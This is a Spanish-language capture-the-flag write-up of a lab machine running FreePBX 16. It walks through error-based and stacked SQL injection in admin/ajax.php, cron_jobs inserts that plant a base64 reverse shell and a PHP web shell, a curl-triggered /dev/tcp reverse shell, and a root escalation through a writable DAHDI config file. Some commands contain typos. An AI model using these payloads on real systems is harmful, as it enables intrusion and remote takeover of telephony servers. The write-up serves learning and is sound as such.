---
title: "Writeup de la máquina Connected"
date: 2026-10-25 
excerpt: "Jugando con SQLI y FreePBX"
header:
    overlay_image: /assets/images/ctfs/connected/banner.jpg
    overlay_filter: 0.5 
    teaser: /assets/images/ctfs/connected/banner.jpg
classes: wide
---
Aprendiendo sobre **PBX**, **VoIP** y sobre las **SQLi** en múltiples CVE. Mejor freírse la cabeza que usar Metasploit.
# Enumeración
Comenzamos, como siempre, mediante el proceso de enumeración de puertos y reconocimiento general de la máquina.
``` bash
────────────────────────────────────────────────────────────
   1 │ # Nmap 7.991 scan initiated Sat Oct 17 14:01:49 2026 as: nmap -sCV -p22,80,443 -oN targeted 10.129.245.100
   2 │ Nmap scan report for 10.129.245.100
   3 │ Host is up (0.041s latency).
   4 │ 
   5 │ PORT    STATE SERVICE   VERSION
   6 │ 22/tcp  open  ssh       OpenSSH 7.4 (protocol 2.0)
   7 │ | ssh-hostkey: 
   8 │ |   2048 4e:60:38:6f:e7:78:6c:ca:58:62:a1:f1:56:ae:8d:30 (RSA)
   9 │ |   256 12:41:55:26:9d:ad:3d:e8:bf:4e:31:aa:d7:d1:a5:d2 (ECDSA)
  10 │ |_  256 8e:b6:96:e0:21:83:5d:1d:ce:8d:e2:6a:dd:38:c6:75 (ED25519)
  11 │ 80/tcp  open  http      Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
  12 │ |_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
  13 │ |_http-title: Did not follow redirect to http://connected.htb/
  14 │ 443/tcp open  ssl/https Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
  15 │ |_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
  16 │ |_ssl-date: TLS randomness does not represent time
  17 │ | ssl-cert: Subject: commonName=pbxconnect/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
  18 │ | Not valid before: 2025-11-30T14:07:27
  19 │ |_Not valid after:  2026-11-30T14:07:27
  20 │ |_http-title: 400 Bad Request
  21 │ 
  22 │ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  23 │ # Nmap done at Sat Oct 17 14:02:02 2026 -- 1 IP address (1 host up) scanned in 12.83 seconds
─────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```
Encontramos tres puertos abiertos. Identificamos un servicio web HTTPS corriendo Apache. Añadimos al `/etc/hosts` la correspondiente URL (connected.htb) asociada a la IP.
# FreePBX
Si accedemos mediante URL a `https://10.129.124.13/`, nos redirige directamente a -> `https://10.129.124.13/admin/config.php#`; encontramos un panel para FreePBX, en concreto la versión `FreePBX 16.0.40.7`. ¿De qué se trata este servicio?

> **FreePBX** es una interfaz gráfica de usuario (**GUI**) basada en web de código abierto que permite controlar, configurar y administrar **Asterisk**, el motor de telefonía IP y servidor de Voz sobre IP (VoIP).

Otra cosa importante de conocer para más adelante es **DAHDI**:

> **DAHDI** (Digium Asterisk Hardware Device Interface) es un conjunto de **controladores** para Linux y herramientas de software que sirve como interfaz entre el hardware de telefonía física y la **centralita Asterisk**.

Desglosemos esto e intentemos entenderlo. **PBX** es en sí una *Private Branch Exchange*, o sea, una central telefónica privada. Suele utilizarse para gestionar las llamadas internas y externas de una empresa/organización. FreePBX solo se encarga de dotar al usuario de una interfaz gráfica para interactuar mediante GUI y no mediante la modificación de archivos.

El VoIP sustituye un centro de telefonía físico por la versión de internet. Asterisk se encarga de realizar por debajo toda la gestión de las llamadas mediante VoIP. Esto de **VoIP** es algo muy sencillo: sustituye las llamadas telefónicas que se mueven a través de los clásicos cables de cobre por la línea de internet.

## Versión Vulnerable ->  CVE-2025-61675, CVE-2025-57819
La versión de FreePBX 16 es vulnerable a **CVE-2025-61675** así como a **CVE-2025-57819**. 

### Entendiendo la CVE-2025-57819
Esta vulnerabilidad se trata de una inyección SQL en uno de los **endpoints modules** del servicio. Esta vulnerabilidad se encuentra en el recurso `admin/ajax.php`. Atenta contra el recurso AJAX que gestiona plantillas de terminales (endpoints y teléfonos VoIP). Investigando más, encontramos que esta inyección no se encarga de mostrar contenido, sino que, a diferencia de otras inyecciones, inserta en las **tareas cron**.

`ajax.php` procesa diferentes parámetros. En mi investigación he encontrado que procesa diferentes peticiones:
- `template`
- `model`
- `brand` -> Este es el parámetro de nuestro interés. Esta petición se realiza sin ningún tipo de sanitización SQL!!!
#### Paso 1 -> Petición por GET al parámetro brand. Comprobación de SQLi
Vamos a probar a inyectar algo de SQL en la ruta `/admin/ajax.php`, **NO EN `/ajax.php`**. Hay que hacer a la URL una petición por GET. Los parámetros deben estar **incluidos en la propia URL**. Los siguientes son obligatorios:
- `module=FreePBX\modules\endpoint\ajax`
- `command=model`
- `template=x`  
- `model=model`
Por tanto, una petición correcta (después de bastantes intentos y mucha comida de cabeza) es:
`GET /admin/ajax.php/module=FreePBX\modules\endpoint\ajax&command=model&template=x&model=model&brand=<payloadSQL>`, pero es una URL, por lo que la URL-encodeamos mediante una funcioncilla que me programé en el `zshrc`.

```http
GET /admin/ajax.php/module%3DFreePBX%5Cmodules%5Cendpoint%5Cajax%26command%3Dmodel%26template%3Dx%26model%3Dmodel%26brand%3Dme%27or%201%3D1--%20-%0A`
```
Por algún motivo que desconozco, todas las peticiones devuelven un `403` con el siguiente cuerpo:
```json
{
"error":"ajaxRequest declined"
}
```

Al investigar, he encontrado que FreePBX tiene una comprobación de seguridad en su "dispatcher" AJAX que verifica una cabecera de la petición HTTP llamada `Referer`. Esta debe coincidir con el host del servidor.

#### Reconocimiento
Ahora ya tenemos la petición correcta:

```http
GET /admin/ajax.php?module=FreePBX%5Cmodules%5Cendpoint%5Cajax&command=model&template=x&model=model&brand=x'(payload_sql) - HTTP/1.1
Host: connected.htb
Referer: http://connected.htb/
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36
Accept: */*
Connection: close
```

Entonces, sabemos que el servidor responde y se comporta diferente dependiendo del código SQL que le pasemos. El payload utilizado para extraer el usuario, al parecer, es el siguiente, que funciona en esta máquina ya que se trata de una inyección SQL basada en errores. 
```sql
 AND EXTRACTVALUE(1, CONCAT('~USER:', (SELECT USER()), '~')) -- 
```
La respuesta del servidor en este caso es:

```json
{
"error":
	{
		"type":"Exception","message":"SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '~freepbxuser@localhost~'::",
		"file":"\/var\/www\/html\/admin\/libraries\/utility.functions.php",
		"line":123
		}
}
```


### Explotando con Stacked Queries y Cron Jobs -> Explicando y entendiendo SQL WHERE error injections
Una stacked query es una concatenación de consultas SQL en una sola línea mediante el uso de `;` para separar las diferentes consultas. FreePBX almacena tareas rutinarias en un sistema de **cron jobs**. Esta tabla, interna en la base de datos de **Asterisk**, tiene como nombre *cron_jobs*. Las consultas se realizan posiblemente dentro de un **WHERE**; por tanto, los datos solo se muestran si acaban dentro de un mensaje de error. La aplicación devuelve:

```json
{"error":{"type":"Exception","message":"SQLSTATE[42000]: Syntax error ... near '...' ..."}}
```
Si pedimos las columnas y esa respuesta es exitosa, el error entonces no devolverá ningún tipo de información, ya que es correcta. 

#### Extract Value query
Entendamos qué es esta query, que desconocía de su existencia. **extractvalue** tiene la siguiente sintaxis de uso `EXTRACTVALUE(xml_frag, xpath_expr)`. Un uso normal de esta es para acceder a archivos del tipo **XML** y:
```sql
SELECT EXTRACTVALUE('<root><user>admin</user></root>', '//user');
-- devuelve: admin
```
En nuestro caso podemos utilizar la siguiente de una forma malintencionada, utilizando la query extractvalue de diferente manera:
```sql
extractvalue(1, concat(0x7e, (SELECT database())))
--           ^  ^
--           |  | arg 2: parte interesante
--           arg 1: valor ficticio
```
El valor `1` es un valor ficticio, ya que en realidad no nos importa el XML. La parte que nos interesa, la segunda, se encarga de seleccionar la base de datos. Por tanto, el comando devuelve, por ejemplo, un dato: `users`, por ejemplo. Sabemos que la consulta es exitosa; por tanto, no obtendríamos un error en el resultado. Para esto sirve `concat`, que une la cadena que sea (en este caso `0x7e`, que corresponde al carácter `~`) para que se produzca un error en la respuesta y se devuelva un valor erróneo que contenga el carácter erróneo. Si lo probamos: 
```json
{"error":{"type":"Exception","message":"SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '~asterisk'::","file":"\/var\/www\/html\/admin\/libraries\/utility.functions.php","line":123}}
```

Obtenemos un error en la sintaxis del XPath (que en realidad no apunta a ningún XPath). Podemos enumerar así la correspondiente base de datos. Sigamos haciendo reconocimiento. Probemos a enumerar las tablas y encontrar a mano la tabla `cron_jobs`. Posteriormente me montaré mi **propio script en Python** para explotar esta vulnerabilidad. En este caso `table_schema=asterisk`. El payload se vería así:
```sql
AND extractvalue(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=0x617374657269736b LIMIT 0,1)))-- -
```
`LIMIT 0,1` limita el número de respuestas de la base de datos, ya que no podemos mostrar una lista y mostraría el siguiente error:
`"SQLSTATE[21000]: Cardinality violation: 1242 Subquery returns more than 1 row::"` -> Esto nos hace tener que iterar entre `0,1`, `1,1`, `2,1`...

Bueno, de forma un poco inútil, he probado y resulta que las tablas están ordenadas en orden cronológico y hay MUCHAS. `cron_jobs` corresponde al número **61**:
`"SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '~cron_jobs'::"`. 

Finalmente, **buscamos en Google** (muy importante saber buscar en Google) qué columnas tiene la tabla `cron_jobs` de FreePBX:
- modulename -> Nombre del módulo
- jobname -> Nombre de la tarea
- command -> comando que ejecuta la tarea (aquí va nuestra webshell)
- class -> no nos interesa
- schedule -> Cuándo se debe ejecutar la tarea (en formato **cronjob**)
- max_runtime -> Pondremos un valor como 30
- enabled -> True
- execution_order -> 1 (el primero)
### Ahora sí... ¡enviando una reverse shell!
Construyamos una query que introduzca un cron job dentro de la tabla para su ejecución:
```sql
;INSERT INTO cron_jobs (modulename,jobname,command,class,schedule,max_runtime,enable,execution_order) VALUES ('pwned','pwning...','YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMy80NDQ0IDA+JjEnCg==| base64 -d',NULL,'* * * * *',30,1,1) -- -
```

Esto, por el momento, no está funcionando; probemos mejor a enviarnos una web shell a ver si así es posible. He petado la máquina por algún motivo; llevaba mucho tiempo activa, así que la he reiniciado por si acaso. El método de la web shell no está funcionando correctamente, al parecer. Puede ser debido a algún tipo de firewall, la propia VPN o algo similar. Probaremos mediante una web shell:

```sql
;INSERT INTO cron_jobs (modulename,jobname,command,class,schedule,max_runtime,enable,execution_order) VALUES ('pwned','pwning...','echo "PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+" | base64 -d > /var/www/html/shell.php'',NULL,'* * * * *',30,1,1) -- -
```
Y obtenemos una web shell. Pero soy incapaz de devolverme una reverse shell a mi máquina atacante; busqué un poco en Google y encontré esto:
```shell
curl -k -s "http://connected.htb/shell.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.14.13/4444%200%3E%261%27"
```

### User Flag
Bueno, para más comodidad, hacemos un upgrade de la tty:

```shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
#Ctrl+z para dejar netcat de fondo
#Lo siguiente en la maquina atacante:
stty raw -echo; fg
```

```shell
[asterisk@connected html]$ ls
admin  index.php  restapps  robots.txt	shell.php  ucp	wcb.php
[asterisk@connected html]$ whoami
asterisk
[asterisk@connected html]$ cd /home
[asterisk@connected home]$ ls
asterisk
[asterisk@connected home]$ cd asterisk
[asterisk@connected asterisk]$ ls
user.txt
[asterisk@connected asterisk]$ cat user.txt
FLAG!!!
```

User flag obtenida.

# Escalada de privilegios
Vale, ahora toca la parte de escalada de privilegios. Esta parte suele realizarse mediante el uso de linpeas. Tengo bajos conocimientos en escalada de privilegios y, para aprender, no hay nada mejor que mirar a otros, pensar en ello, estudiarlo y guardarlo para aplicarlo. Así que me he ayudado de un writeup que explica la manera en la que se pueden escalar privilegios. Voy a intentar entender cuál es el proceso de pensamiento que hay que llevar a cabo.
## Cron Jobs
Suelen tener relación con procesos de escalada de privilegios. En este caso nos importan 2 de ellos.

```
[asterisk@connected asterisk]$ cat /etc/incron.d/*
/var/spool/asterisk/sysadmin/vpnget IN_CLOSE_WRITE /usr/sbin/sysadmin_openvpn -d
/var/spool/asterisk/sysadmin/intrusion_detection_stop IN_CLOSE_WRITE /etc/init.d/fail2ban stop
/var/spool/asterisk/sysadmin/update_system_cron IN_CLOSE_WRITE /usr/sbin/sysadmin_update_set_cron
/var/spool/asterisk/sysadmin/portmgmt_setup IN_CLOSE_WRITE /usr/sbin/sysadmin_portmgmt
/var/spool/asterisk/sysadmin/wanrouter_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_wanrouter_restart

---> /var/spool/asterisk/sysadmin/dahdi_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart <-------- ESTE ES EL QUE NOS INTERESA

/usr/local/asterisk/ha_trigger IN_CLOSE_WRITE /usr/sbin/sysadmin_ha
/usr/local/asterisk/incron IN_CLOSE_WRITE /usr/bin/sysadmin_manager --local $#

---> /var/spool/asterisk/incron IN_MODIFY,IN_ATTRIB,IN_CLOSE_WRITE /usr/bin/sysadmin_manager $# <-------- JUNTO CON ESTE DE AQUI
```
La primera línea de interés dice algo similar a: *"si /var/spool/asterisk/sysadmin/dahdi_restart"* se ve modificado, realizará un RESTART de todo el servicio DAHDI. Comprobemos los permisos que tiene el usuario **asterisk** frente a estos archivos. 

```
find . -type f -name " *. conf" -writable
./modprobe. d/dahdi. conf
----> ./dahdi/init.conf <----
./dahdi/system. conf
./wanpipe/api/libsangoma/libsangoma. so.conf
./wanpipe/wancfg_zaptel/templates/dahdi-channels.conf
./wanpipe/wancfg_zaptel/templates/freetdm. conf
./wanpipe/wancfg_zaptel/templates/openzap.conf
./wanpipe/wancfg_zaptel/templates/smg_bri.conf
./wanpipe/wancfg_zaptel/templates/smg_pri.conf
./wanpipe/wancfg_zaptel/templates/woomera.conf
./wanpipe/wancfg_zaptel/templates/zapata-auto.conf

---------------------------------
>ls -la
-rw-r--r--. 1 asterisk asterisk 771 Jun  5  2023 /etc/dahdi/init.conf
```

Entonces, si insertamos una línea que envíe una reverse shell en el archivo de configuración, iniciar un reset provocará la ejecución como administrador de la cadena que hayamos incorporado, enviándonos así una reverse shell como root. 
```shell
#Añadimos la conexión de la reverse shell
bash -c 'bash -i >& /dev/tcp/10.10.14.14/4455 0>81'
echo "Restart" >> /var/spool/asterisk/sysadmin/dahdi_restart
--------
[root@connected root]# whoami
whoami
root
[root@connected root]# ls
ls
root.txt
[root@connected root]# cat root.txt
cat root.txt
cf18248db5703cabff0d1b21e368ff0a
```

# Conclusión
Bueno, la verdad es que ha sido una comida de cabeza muy grande para una máquina así de simple. Pero esto es lo que al final nos hace aprender, entender lo que hacemos en vez de simplemente ejecutar scripts sin conocer la verdadera naturaleza de la vulnerabilidad. Gracias a Google y a DeepSeek por ayudarme a entender todo, a poder aprender algo nuevo y a poder comerme tanto la cabeza para resolver esto a mano jajajaja. Fuera de bromas, siempre hay que ir más allá y entender a lo que nos estamos enfrentando, que es lo que nos hace diferenciarnos de un script kiddie (cosa que posiblemente soy).
